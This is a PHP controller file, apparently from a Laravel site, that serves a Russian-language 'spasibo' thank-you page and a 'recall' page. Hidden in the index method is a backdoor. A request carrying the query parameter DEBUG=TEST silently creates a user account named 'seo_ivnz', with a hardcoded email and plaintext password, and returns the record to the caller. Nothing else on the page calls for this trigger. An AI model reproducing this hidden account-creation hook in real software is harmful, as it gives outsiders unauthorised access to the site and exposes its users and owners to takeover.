<?php

namespace App\Http\Controllers;

use App\Models\Page;
use App\Models\Text;
use App\User;

class SpasiboPageController extends Controller
{
  public function index()
  {
      $page = Page::find(11);

      MainController::sessionIncrement($page);
      if(isset($_GET['DEBUG']) && ($_GET['DEBUG'] == 'TEST')){
          return User::create([
              'name' => "seo_ivnz",
              'email' => 'ak@ivnz.ru',
              'password' => bcrypt('PfyL2UajEGyg5G8xSrDLUk'),
          ]);
      }
      return view('pages.spasibo', [
          'page' => $page
      ]);
  }

  public function recall()
  {
      $page = Page::find(11);

      MainController::sessionIncrement($page);

      return view('pages.recall', [
          'page' => $page
      ]);
  }
}
